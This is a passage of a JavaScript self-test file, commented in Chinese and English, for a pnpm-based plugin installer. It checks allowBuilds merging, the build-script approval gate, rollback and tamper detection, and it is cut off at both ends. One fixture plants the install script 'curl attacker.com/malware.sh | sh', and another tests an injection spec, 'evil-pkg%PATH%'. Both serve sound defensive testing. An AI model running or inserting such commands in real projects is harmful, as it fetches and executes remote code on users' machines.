    content: BASE_WS,
    names: ["node-pty"],
    check: (out) => load(out).allowBuilds?.["node-pty"] === true,
  },
  {
    label: "pnpm 的未决占位符 —— 改写成 true，而不是当作已放行跳过",
    content: `${BASE_WS}allowBuilds:\n  node-pty: set this to true or false\n`,
    names: ["node-pty"],
    check: (out) => load(out).allowBuilds?.["node-pty"] === true,
  },
  {
    label: "已有映射条目 —— 追加同为映射，不混格式",
    content: `${BASE_WS}allowBuilds:\n  esbuild: true\n`,
    names: ["node-pty"],
    check: (out) => { const a = load(out).allowBuilds; return a?.esbuild === true && a?.["node-pty"] === true; },
  },
  {
    label: "已有序列条目 —— 追加同为序列，不混格式（正是砖化那次的形状）",
    content: `${BASE_WS}allowBuilds:\n  - 'esbuild'\n`,
    names: ["node-pty"],
    check: (out) => { const a = load(out).allowBuilds; return Array.isArray(a) && a.includes("esbuild") && a.includes("node-pty"); },
  },
  {
    label: "序列里已存在 —— 无需改动",
    content: `${BASE_WS}allowBuilds:\n  - 'node-pty'\n`,
    names: ["node-pty"],
    expectNoChange: true,
  },
  {
    label: "映射里已是 true —— 无需改动",
    content: `${BASE_WS}allowBuilds:\n  node-pty: true\n`,
    names: ["node-pty"],
    expectNoChange: true,
  },
  {
    label: "scoped 包名在序列里要加引号（@ 是 YAML 保留指示符）",
    content: `${BASE_WS}allowBuilds:\n  - 'esbuild'\n`,
    names: ["@scope/native-thing"],
    check: (out) => load(out).allowBuilds?.includes("@scope/native-thing"),
  },
  {
    label: "allowBuilds 后面还有别的 key —— 不插到别人块里",
    content: `packages:\n  - .\n\nallowBuilds:\n  esbuild: true\n\nnodeLinker: hoisted\n`,
    names: ["node-pty"],
    check: (out) => { const d = load(out); return d.allowBuilds?.["node-pty"] === true && d.nodeLinker === "hoisted"; },
  },
  {
    label: "非法包名被过滤，无合法名时不动文件",
    content: BASE_WS,
    names: ["9 | - pkg", "Run \"pnpm approve-builds\""],
    expectNoChange: true,
  },
  {
    label: "文件本来就坏 —— 拒绝编辑，不让它更坏",
    content: "allowBuilds:\n  - 'a'\n  a: b\n",
    names: ["node-pty"],
    expectThrow: true,
  },
];

function runAllowBuildsFixtures() {
  let failed = 0;
  for (const fx of ALLOW_BUILDS_FIXTURES) {
    let out, error;
    try { out = mergeAllowBuilds(fx.content, fx.names); } catch (e) { error = e; }
    let ok;
    if (fx.expectThrow) ok = error !== undefined;
    else if (error !== undefined) ok = false;
    else if (fx.expectNoChange) ok = out === undefined;
    else ok = out !== undefined && (() => { try { return fx.check(out) === true; } catch { return false; } })();
    // 任何产出都必须是可解析的 YAML —— 这是这组用例存在的全部理由。
    if (ok && out !== undefined) {
      try { load(out); } catch { ok = false; }
    }
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${fx.label}`);
    if (!ok && out !== undefined) console.log(`       产出:\n${out.split("\n").map((l) => `       | ${l}`).join("\n")}`);
    if (!ok && error !== undefined) console.log(`       抛错: ${error.message}`);
  }
  failed += runNeutralizeFixtures();
  return failed;
}

// ── neutralizeWorkspaceContent：保留哪些批准 ────────────────────────────────
//
// 实测确定的 pnpm 11 行为，这组用例建立在它之上：
//   - allowBuilds 里 registry 包用裸名或 `name@version` 都能放行；
//   - `file:`/`link:` 依赖只认 pnpm 自己的完整 selector，裸名无效；
//   - allowBuilds 被清空后，pnpm 会重新报树里**任何**带脚本的包，
//     哪怕这次安装跟它毫无关系 —— 这正是 node-pty 反复弹窗的来源。
//
// 所以这里钉的是范围：已装且版本未变的批准要留下（并钉上版本），
// 其余一律丢弃。丢弃的方向是「再问一次」，永远不是「默默放行」。
const NEUTRALIZE_FIXTURES = [
  {
    label: "已装且已批准（裸名）→ 保留，并钉到已装版本",
    content: "packages:\n  - .\nallowBuilds:\n  node-pty: true\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => d.allowBuilds["node-pty@1.1.0"] === true && d.allowBuilds["node-pty"] === undefined,
  },
  {
    label: "已装且已批准（带版本且一致）→ 原样保留",
    content: "packages:\n  - .\nallowBuilds:\n  'node-pty@1.1.0': true\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => d.allowBuilds["node-pty@1.1.0"] === true,
  },
  {
    label: "批准的版本与已装版本不符 → 丢弃（升级必须重新批准）",
    content: "packages:\n  - .\nallowBuilds:\n  'node-pty@1.0.0': true\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "批准过但树里没有 → 丢弃（新引入的同名包不许蹭）",
    content: "packages:\n  - .\nallowBuilds:\n  node-pty: true\n",
    installed: {},
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "序列形态的 allowBuilds 同样按已装版本钉住",
    content: "packages:\n  - .\nallowBuilds:\n  - 'node-pty'\n  - 'esbuild'\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => d.allowBuilds["node-pty@1.1.0"] === true && Object.keys(d.allowBuilds).length === 1,
  },
  {
    label: "值不是 true 的未决占位符 → 不算批准",
    content: "packages:\n  - .\nallowBuilds:\n  node-pty: set this to true or false\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "file: selector 无法与版本号对应 → 丢弃重问",
    content: "packages:\n  - .\nallowBuilds:\n  'pkg@file:../pkg': true\n",
    installed: { pkg: "1.0.0" },
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "不传解析器 → 退回全清（老行为，绝不放宽）",
    content: "packages:\n  - .\nallowBuilds:\n  node-pty: true\n",
    installed: undefined,
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "解析器抛错 → 当作没批准过",
    content: "packages:\n  - .\nallowBuilds:\n  node-pty: true\n",
    resolver: () => { throw new Error("node_modules unreadable"); },
    check: (d) => Object.keys(d.allowBuilds).length === 0,
  },
  {
    label: "两个广义开关始终关闭",
    content: "packages:\n  - .\ndangerouslyAllowAllBuilds: true\nonlyBuiltDependencies:\n  - anything\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => d.dangerouslyAllowAllBuilds === false && Array.isArray(d.onlyBuiltDependencies) && d.onlyBuiltDependencies.length === 0,
  },
  {
    label: "其余键原样保留（不碰用户的别的设置）",
    content: "packages:\n  - .\nnodeLinker: hoisted\nminimumReleaseAgeExclude:\n  - 'a@1.0.0'\nallowBuilds:\n  node-pty: true\n",
    installed: { "node-pty": "1.1.0" },
    check: (d) => d.nodeLinker === "hoisted" && d.minimumReleaseAgeExclude[0] === "a@1.0.0",
  },
];

function runNeutralizeFixtures() {
  let failed = 0;
  for (const fx of NEUTRALIZE_FIXTURES) {
    const resolver = fx.resolver ?? (fx.installed === undefined ? undefined : (name) => fx.installed[name]);
    let ok;
    try {
      ok = fx.check(load(neutralizeWorkspaceContent(fx.content, resolver))) === true;
    } catch {
      ok = false;
    }
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} neutralize: ${fx.label}`);
  }
  return failed;
}

// ── transaction fixtures (deterministic, offline) ───────────────────────────
//
// The findings these pin:
//   1. pnpm exiting 0 while printing "Ignored build scripts" must NOT
//      finalize success — the approval gate applies to successful output too.
//   2. An exception in finalizeSuccess must become a terminal failed outcome
//      WITH rollback — done resolves exactly once, never rejects.
//   3. add/remove are serialized per profile; remove fails closed while a
//      pending marker exists; cancel while queued never spawns pnpm.
//   4. The spawn plan resolves pnpm without a shell where possible, and a
//      cancelled install rolls back only after the process exited.
// They drive runInstall/runRemove through the `_profileDir`/`_spawn`/
// `_describe` seams against temp profiles (<tmp>/home/profiles/p), so no real
// profile, pnpm, or network is involved.

/** Minimal fake ChildProcess: stdout/stderr emitters, kill(), manual finish. */
/**
 * `killAs` picks which platform's cancellation this fake reproduces.
 *
 * It used to hard-code the POSIX one — close(null, "SIGTERM") — and that is
 * precisely why the "取消在途 install → killed" fixture stayed green while
 * the real Windows path reported `failed (exit code 1)`: the fake was written
 * from the code's assumption instead of from what the OS does. On Windows the
 * shell-wrapped pnpm is terminated by `taskkill /T /F`, not signalled, and
 * Node reports close(1, null). Both dialects are now pinned.
 */
class FakeProc extends EventEmitter {
  constructor(killAs = "posix") {
    super();
    this.stdout = new EventEmitter();
    this.stderr = new EventEmitter();
    this.pid = 424242;
    this.signalCode = null;
    this.killAs = killAs;
  }
  kill() {
    queueMicrotask(() => {
      if (this.killAs === "win32") {
        // taskkill /T /F: terminated, never signalled — an ordinary nonzero exit.
        this.emit("close", 1, null);
        return;
      }
      this.signalCode = "SIGTERM";
      this.emit("close", null, "SIGTERM");
    });
  }
  finish(code, out = "") {
    queueMicrotask(() => {
      if (out.length > 0) this.stdout.emit("data", Buffer.from(out));
      this.emit("close", code);
    });
  }
}

/** Spawn fake consuming scripted {code, out, beforeExit} steps; records calls. */
function scriptedSpawn(steps) {
  const calls = [];
  const spawnFn = (command, args, options) => {
    calls.push({ command, args, options });
    const proc = new FakeProc();
    const step = steps[calls.length - 1];
    if (step === undefined) proc.finish(1, "unexpected extra spawn");
    else {
      step.beforeExit?.();
      proc.finish(step.code, step.out ?? "");
    }
    return proc;
  };
  return { spawnFn, calls };
}

/** Spawn fake whose procs stay alive until the test finishes them. */
function blockingSpawn(killAs = "posix") {
  const procs = [];
  const spawnFn = () => {
    const proc = new FakeProc(killAs);
    procs.push(proc);
    return proc;
  };
  return { spawnFn, procs };
}

/** Temp profile at <tmp>/home/profiles/p — guard home resolves to <tmp>/home/guard. */
function makeTempProfile(label, dependencies = {}) {
  const home = mkdtempSync(join(tmpdir(), `dsh-mall-selftest-${label}-`));
  const profileDir = join(home, "profiles", "p");
  mkdirSync(profileDir, { recursive: true });
  const manifest = JSON.stringify({ name: "p", dependencies }, undefined, 2) + "\n";
  writeFileSync(join(profileDir, "package.json"), manifest);
  return { home, profileDir, manifest, cleanup: () => rmSync(home, { recursive: true, force: true }) };
}

function materializeFakePackage(profileDir, name, version = "1.0.0", scripts = {}, files = { "index.js": "module.exports = {};\n" }) {
  const pkgDir = join(profileDir, "node_modules", ...name.split("/"));
  mkdirSync(pkgDir, { recursive: true });
  const manifest = { name, version, scripts };
  writeFileSync(join(pkgDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
  for (const [relPath, content] of Object.entries(files)) {
    const full = join(pkgDir, relPath);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return pkgDir;
}

const describeStub = async (missing) => missing.map((entry) => ({ ...entry, direct: true, scripts: {} }));

// 回滚校验要求 marker 能指认候选包（guard.js sanitizeSnapshot），生产环境由
// preflight 报告带来；fixtures 给同名存根。
const preflightStub = (name) => ({ candidate: { name } });

async function runTransactionFixtures() {
  let failed = 0;
  const check = (label, ok, extra) => {
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${label}`);
    if (!ok && extra !== undefined) console.log(`       ${extra}`);
  };
  const tick = () => new Promise((resolve) => setTimeout(resolve, 1));
  const flush = async (rounds = 5) => { for (let index = 0; index < rounds; index++) await tick(); };

  // 纯函数前置：spec 黑名单。`%` 必须在内——cmd 的 %VAR% 展开元字符，
  // 展开值里的分号/空格足以重塑 argv；三处黑名单曾漂移（cli.js 一直有，
  // installer/guard 漏过）。
  {
    const rejects = (value) => {
      try { assertSafeSpec(value); return false; } catch { return true; }
    };
    check("assertSafeSpec：cmd 的 %VAR% 展开元字符被拒绝", rejects("evil-pkg%PATH%"));
    check("assertSafeSpec：正常 spec 不受影响", !rejects("some-plugin@1.0.0") && !rejects("github:owner/repo"));
  }

  // 0. hashPackageTree 确定性与符号链接越界防御
  {
    const tempDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-hash-"));
    try {
      materializeFakePackage(tempDir, "test-pkg", "1.0.0", { postinstall: "node test.js" }, { "a.js": "const a = 1;\n", "b.js": "const b = 2;\n" });
      const pkgPath = join(tempDir, "node_modules", "test-pkg");
      const hash1 = hashPackageTree(pkgPath);
      const hash2 = hashPackageTree(pkgPath);
      check("hashPackageTree 确定性（内容不变哈希相同）", typeof hash1 === "string" && hash1.length === 64 && hash1 === hash2);

      // 修改文件内容哈希改变
      writeFileSync(join(pkgPath, "a.js"), "const a = 999;\n");
      const hash3 = hashPackageTree(pkgPath);
      check("包内文件修改 → hashPackageTree 哈希变化", hash1 !== hash3);

      // Bundled dependencies live below the package's own node_modules and
      // may contain lifecycle helpers/native loaders. They are artifact bytes,
      // not the profile's dependency tree, so changing them must invalidate
      // the approval proof as well.
      const bundledDir = join(pkgPath, "node_modules", "bundled-helper");
      mkdirSync(bundledDir, { recursive: true });
      writeFileSync(join(bundledDir, "package.json"), '{"name":"bundled-helper","version":"1.0.0"}\n');
      writeFileSync(join(bundledDir, "loader.js"), "safe();\n");
      const bundledHash1 = hashPackageTree(pkgPath);
      writeFileSync(join(bundledDir, "loader.js"), "malicious();\n");
      const bundledHash2 = hashPackageTree(pkgPath);
      check("包内 bundled node_modules 字节变化 → artifact hash 变化", bundledHash1 !== bundledHash2);

      // 符号链接/Junction 越界防御
      const outsideDir = mkdtempSync(join(tmpdir(), "dsh-mall-outside-"));
      try {
        writeFileSync(join(outsideDir, "secret.txt"), "secret");
        let escapeDetected = false;
        try {
          const { symlinkSync } = await import("node:fs");
          try {
            symlinkSync(outsideDir, join(pkgPath, "link-outside-dir"), "junction");
          } catch {
            symlinkSync(join(outsideDir, "secret.txt"), join(pkgPath, "link-outside.txt"));
          }
          hashPackageTree(pkgPath);
        } catch (err) {
          escapeDetected = /symlink escape/.test(err.message);
        }
        check("hashPackageTree 符号链接越界防御（拒绝越界 symlink）", escapeDetected);
      } finally {
        rmSync(outsideDir, { recursive: true, force: true });
      }
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  }

  // 1a. exit 0 + "Ignored build scripts" 且未批准：必须停在批准闸（failed +
  // needsApproval），携带 proof，绝不 finalize，且是暂停不是失败——现场与
  // marker 原样保留给带 token 的重试（回滚会让重试的 approval token 必死，
  // 见收尾处的真实事故注释），只 spawn 一次。
  {
    const { profileDir, cleanup } = makeTempProfile("ignored-gate");
    try {
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      // pnpm 11 on Windows may colour stderr even when it is captured through a
      // pipe.  In particular, the reset code lands directly after the selector.
      const colouredIgnoredBuilds = "Packages are cloned\n\u001b[31mIgnored build scripts: node-pty@1.0.0\u001b[39m\nDone\n";
      const { spawnFn, calls } = scriptedSpawn([{ code: 0, out: colouredIgnoredBuilds }]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        // Deliberately stale/malicious registry data. The approval disclosure
        // must still use the manifest and bytes from the materialized tree.
        _describe: async () => [{
          name: "node-pty",
          version: "1.0.0",
          direct: true,
          scripts: { install: "registry lied" },
          contentHash: "0".repeat(64),
          weeklyDownloads: 123,
        }],
      });
      const outcome = await producer.done;
      const output = producer.readOutput();
      const markerBefore = pendingMarkerPath(profileDir);
      check(
        "退出码 0 + 彩色 Ignored build scripts（未批准）→ 停在批准闸，返回 proof，不 finalize，暂停保留 marker",
        outcome.status === "failed"
          && Array.isArray(outcome.needsApproval)
          && outcome.needsApproval.some((entry) => entry.name === "node-pty")
          && outcome.proof !== undefined
          && outcome.proof.candidate.name === "some-plugin"
          && outcome.proof.blockedPackages.some((e) => e.name === "node-pty")
          && outcome.needsApproval.some((entry) => entry.name === "node-pty"
            && entry.version === "1.0.0"
            && entry.scripts?.install === "node install.js"
            && entry.contentHash === outcome.proof.blockedPackages.find((proofEntry) => proofEntry.name === "node-pty")?.contentHash
            && entry.contentHash !== "0".repeat(64)
            && entry.weeklyDownloads === 123)
          && calls.length === 1
          && existsSync(markerBefore)
          && /candidate is staged/.test(outcome.detail ?? "")
          && !/profile was restored/.test(outcome.detail ?? "")
          && /paused for build-script approval/.test(output)
          && /Ignored build scripts: node-pty@1\.0\.0/.test(output)
          && !output.includes("\u001b["),
        `status=${outcome.status} calls=${calls.length} marker=${existsSync(markerBefore)}`,
      );
      check(
        "暂停必须落盘到 marker（metadata.paused）——重启后的恢复靠它区分「装完待验证」与「停在批准闸被放弃」",
        (() => {
          try {
            const marker = JSON.parse(readFileSync(markerBefore, "utf8"));
            return marker?.metadata?.paused?.reason === "paused for build-script approval";
          } catch { return false; }
        })(),
      );

      // 1a-ter. 暂停期间装别的包：拒绝是对的（marker 是一次性事务），但用户
      // 看不见 marker，所以报错必须点名挡路的是那次「停在允许安装依赖」的
      // 安装，并给出让它让开的办法。这里 marker 仍带 paused。
      {
        const during = scriptedSpawn([{ code: 0, out: "Done\n" }]);
        const duringOutcome = await runInstall({
          profile: "p",
          spec: "other-during-pause",
          preflight: preflightStub("other-during-pause"),
          _profileDir: profileDir,
          _spawn: during.spawnFn,
          _describe: async () => [],
        }).done;
        check(
          // staleOnRestart：这条报错是现在时写的，而挡路的事务必然被启动恢复
          // 了结——留到重启之后会被当成当前状态读，所以面板要撤掉它。
          "暂停期间装别的包 → 拒绝，报错点名「停在允许安装依赖」+ 撤回办法 + 标记重启后失效",
          duringOutcome.status === "failed"
            && /停在「允许安装依赖」/.test(duringOutcome.detail ?? "")
            && /重启 dsh/.test(duringOutcome.detail ?? "")
            && duringOutcome.staleOnRestart === true
            && during.calls.length === 0,
          `status=${duringOutcome.status} detail=${(duringOutcome.detail ?? "").slice(0, 120)}`,
        );
      }

      // 1a-bis. 同 spec 重试接管暂停的 marker：不再新建快照（回滚目标仍是
      // 第一次安装前的现场），继续 spawn pnpm；这次给批准后的成功路径——
      // completed 后 marker 保留给启动提交，且暂停标记必须已被接管清掉
      // （否则启动提交会被它拦下错误回滚）。异 spec 则拒绝且不 spawn。
      {
        const snapshotRootDir = join(dirname(dirname(profileDir)), "guard", "snapshots");
        const snapshotsBefore = readdirSync(snapshotRootDir, { withFileTypes: true }).filter((e) => e.isDirectory()).length;
        const retry = scriptedSpawn([{ code: 0, out: "Done in 1s\n" }]);
        const retryProducer = runInstall({
          profile: "p",
          spec: "some-plugin",
          preflight: preflightStub("some-plugin"),
          _profileDir: profileDir,
          _spawn: retry.spawnFn,
          _describe: async () => [],
        });
        const retryOutcome = await retryProducer.done;
        const retryOutput = retryProducer.readOutput();
        const snapshotsAfter = readdirSync(snapshotRootDir, { withFileTypes: true }).filter((e) => e.isDirectory()).length;
        check(
          "同 spec 重试接管暂停的 marker → 复用原快照、继续安装并清掉暂停标记",
          retryOutcome.status === "completed"
            && retry.calls.length === 1
            && /resuming the paused install transaction/.test(retryOutput)
            && snapshotsAfter === snapshotsBefore
            && existsSync(markerBefore)
            && (() => {
              try {
                const marker = JSON.parse(readFileSync(markerBefore, "utf8"));
                return marker?.metadata?.paused === undefined;
              } catch { return false; }
            })(),
          `status=${retryOutcome.status} calls=${retry.calls.length} snapshots=${snapshotsBefore}->${snapshotsAfter}`,
        );
        const other = scriptedSpawn([{ code: 0, out: "Done\n" }]);
        const otherOutcome = await runInstall({
          profile: "p",
          spec: "another-plugin",
          preflight: preflightStub("another-plugin"),
          _profileDir: profileDir,
          _spawn: other.spawnFn,
          _describe: async () => [],
        }).done;
        check(
          // 此刻 paused 已被上面的接管清掉，所以报错走的是「未了结」那一支，
          // 而不是「停在允许安装依赖」那一支。
          "异 spec 遇既有（已非暂停）marker → 拒绝且不 spawn",
          otherOutcome.status === "failed"
            && /还没了结/.test(otherOutcome.detail ?? "")
            && !/停在「允许安装依赖」/.test(otherOutcome.detail ?? "")
            && otherOutcome.staleOnRestart === true
            && other.calls.length === 0,
          `status=${otherOutcome.status} calls=${other.calls.length}`,
        );
      }
      const call = calls[0] ?? { args: [], options: {} };
      check(
        "实装 argv/env：strict-dep-builds + peer 关闭 + cwd/shell 正确",
        JSON.stringify(call.args) === JSON.stringify(liveAddArgs("some-plugin"))
          && call.args.includes("--config.strict-dep-builds=true")
          && call.args.includes("--config.auto-install-peers=false")
          && call.options.env?.npm_config_strict_dep_builds === "true"
          && call.options.env?.NPM_CONFIG_STRICT_DEP_BUILDS === "true"
          && call.options.env?.npm_config_auto_install_peers === "false"
          && call.options.cwd === profileDir
          && call.options.shell === false,
        JSON.stringify({ args: call.args, shell: call.options?.shell, cwd: call.options?.cwd }),
      );
    } finally {
      cleanup();
    }
  }

  // 1b. exit 0 + Ignored build scripts 且已点名批准 + approvedProof 匹配：
  // 写 allowBuilds 重试一次，重试输出干净才 finalize；成功后 workspace 原样还原，保留 pending marker。
  {
    const { profileDir, cleanup } = makeTempProfile("ignored-approved");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      let temporaryApprovedWorkspace;
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        {
          code: 0,
          out: "Done\n",
          beforeExit: () => {
            temporaryApprovedWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
          },
        },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "退出码 0 + Ignored build scripts（已批准+proof 匹配）→ 重试成功，workspace 字节还原（不残留 allowBuilds），marker 保留",
        outcome.status === "completed"
          && calls.length === 2
          && calls[1].args[0] === "rebuild"
          && calls[1].args.includes("node-pty")
          && !calls[1].args.includes("some-plugin")
          && temporaryApprovedWorkspace?.allowBuilds?.["node-pty@1.0.0"] === true
          && temporaryApprovedWorkspace?.dangerouslyAllowAllBuilds === false
          && Array.isArray(temporaryApprovedWorkspace?.onlyBuiltDependencies)
          && temporaryApprovedWorkspace.onlyBuiltDependencies.length === 0
          && finalWs === initialWs
          && existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} calls=${calls.length} finalWs=${JSON.stringify(finalWs)} marker=${existsSync(pendingMarkerPath(profileDir))}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1c. 攻击防御：批准后修改 postinstall / 文件内容 → retry 时 proof 校验失败，绝不重试并回滚
  {
    const { profileDir, cleanup } = makeTempProfile("attack-tampered-proof");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node safe-install.js" });
      const originalProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      // 模拟攻击者在审批之后篡改了 node-pty 的 install 脚本和文件
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "curl attacker.com/malware.sh | sh" }, { "malware.js": "evil();\n" });

      const maliciousRan = join(profileDir, "MALICIOUS_RAN");
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 0, out: "Done\n", beforeExit: () => writeFileSync(maliciousRan, "bad\n") },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "file:../same-mutable-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof: originalProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "攻击防御：同名包篡改脚本/内容后重试 → proof 不匹配立即拒绝，不触发二次 spawn，workspace/profile 回滚",
        outcome.status === "failed"
          && /security verification failed/.test(outcome.detail ?? "")
          && calls.length === 1
          && !existsSync(maliciousRan)
          && finalWs === initialWs
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} calls=${calls.length} detail=${outcome.detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1d. 攻击防御：预先存在的 allowBuilds 不能替**新东西**盖章。
  //
  // 这条原本断言的是「任何预先存在的 allowBuilds 一律不认」。那个范围太宽：
  // 它同时把「早已落盘、早已批准、这次根本没动」的包也重新拦下，于是装任何
  // 不相干的插件都会为 node-pty 之类的传递依赖再弹一次审批卡。一个每次安装
  // 都因为你没选的包而弹的同意框，训练出来的是无脑点同意——恰好摧毁这道闸
  // 在它本职场景里的作用。
  //
  // 所以守的边界改成：**盖章只对「此刻就在盘上、且这次装完还是同一份」的包
  // 有效**。下面两条钉住它拦得住的、一条钉住它该放行的；三条都同时验证两个
  // 广义开关被强制关闭、事后恢复用户原本的 workspace 字节。
  // 时序很要紧：neutralize 在 pnpm 跑之前决定放行名单，那一刻本次事务要装的
  // 东西还没落盘。所以「新包」在决策点上就是「盘上没有」，这两条照这个时序
  // 模拟——由 scriptedSpawn 的 beforeExit 扮演 pnpm 把包装上去。
  const preexistingAllowCases = [
    {
      label: "本次新引入的包 → 预先盖的章无效，仍触发审批闸",
      preinstalled: undefined,           // 决策点上盘里没有
      reported: "evil-script-pkg@1.0.0", // pnpm 装完后报的
      landed: "1.0.0",
      expectPins: {},                    // 章被丢弃
    },
    {
      label: "已批准的包被本次升级 → 旧章只钉住旧版本，新版本仍被拦",
      preinstalled: "1.0.0",             // 决策点上是 1.0.0，章有效
      reported: "evil-script-pkg@1.1.0", // 但装上来的是 1.1.0
      landed: "1.1.0",
      expectPins: { "evil-script-pkg@1.0.0": true },
    },
  ];
  for (const testCase of preexistingAllowCases) {
    const { profileDir, cleanup } = makeTempProfile("bypass-preexisting-allow");
    try {
      const initialWs = "packages:\n  - .\n\nallowBuilds:\n  evil-script-pkg: true\nonlyBuiltDependencies:\n  - evil-script-pkg\ndangerouslyAllowAllBuilds: true\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      if (testCase.preinstalled !== undefined) {
        materializeFakePackage(profileDir, "evil-script-pkg", testCase.preinstalled, { postinstall: "node evil.js" });
      }

      let firstProbeWorkspace;
      const { spawnFn, calls } = scriptedSpawn([
        {
          code: 0,
          out: `Ignored build scripts: ${testCase.reported}\n`,
          beforeExit: () => {
            firstProbeWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
            // pnpm 此刻把包落盘（新装或升级），披露据此计算。
            materializeFakePackage(profileDir, "evil-script-pkg", testCase.landed, { postinstall: "node evil.js" });
          },
        },
      ]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      }).done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        `攻击防御：${testCase.label}（且两个广义开关强制关闭、事后恢复原字节）`,
        outcome.status === "failed"
          && Array.isArray(outcome.needsApproval)
          && outcome.needsApproval.some((e) => e.name === "evil-script-pkg")
          && calls.length === 1
          && JSON.stringify(firstProbeWorkspace?.allowBuilds) === JSON.stringify(testCase.expectPins)
          && Array.isArray(firstProbeWorkspace?.onlyBuiltDependencies)
          && firstProbeWorkspace.onlyBuiltDependencies.length === 0
          && firstProbeWorkspace?.dangerouslyAllowAllBuilds === false
          && finalWs === initialWs,
        `status=${outcome.status} calls=${calls.length} allowBuilds=${JSON.stringify(firstProbeWorkspace?.allowBuilds)} needsApproval=${JSON.stringify(outcome.needsApproval?.map((e) => `${e.name}@${e.version}`))} wsSame=${finalWs === initialWs}`,
      );
    } finally {
      cleanup();
    }
  }

  // 1d-b. 该放行的那一侧：已落盘、已批准、版本没变的包，装别的东西时不再重问。
  // 交给 pnpm 的是钉了版本的 selector，所以同一次事务若换上另一个版本，
  // 那个版本并不在放行名单里。
  {
    const { profileDir, cleanup } = makeTempProfile("preserve-installed-allow");
    try {
      const initialWs = "packages:\n  - .\n\nallowBuilds:\n  native-pkg: true\ndangerouslyAllowAllBuilds: true\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "native-pkg", "1.1.0", { install: "node build.js" });

      let firstProbeWorkspace;
      const { spawnFn, calls } = scriptedSpawn([
        {
          code: 0,
          out: "Done\n",
          beforeExit: () => {
            firstProbeWorkspace = load(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"));
          },
        },
      ]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      }).done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "已装且版本未变的批准被保留（钉到已装版本），装不相干的包不再重弹审批",
        outcome.status === "completed"
          && calls.length === 1
          && firstProbeWorkspace?.allowBuilds?.["native-pkg@1.1.0"] === true
          && firstProbeWorkspace?.allowBuilds?.["native-pkg"] === undefined
          && firstProbeWorkspace?.dangerouslyAllowAllBuilds === false
          && finalWs === initialWs,
        `status=${outcome.status} detail=${outcome.detail} allowBuilds=${JSON.stringify(firstProbeWorkspace?.allowBuilds)}`,
